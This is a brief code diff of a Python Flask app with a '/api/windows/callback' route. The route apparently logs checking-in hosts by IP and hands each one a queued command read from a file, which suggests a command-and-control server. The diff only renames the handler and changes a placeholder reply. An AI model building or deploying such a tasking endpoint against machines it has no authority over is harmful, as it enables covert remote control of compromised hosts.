@@ -41,7 +41,7 @@ def process_callbacks(ip, typ):
 
 
 @app.route('/api/windows/callback/<ip>/<typ>')
-def process_callbacks(ip, typ):
+def process_win_callbacks(ip, typ):
     global all_hosts
     all_hosts.add(ip)
     src = typ
@@ -62,7 +62,7 @@ def process_callbacks(ip, typ):
             os.remove(com_file)
             return c + "\n"
     else:
-        return "#lmao\n" 
+        return "#cls\n" 
 
 
 def log_action(hosts, cmds):
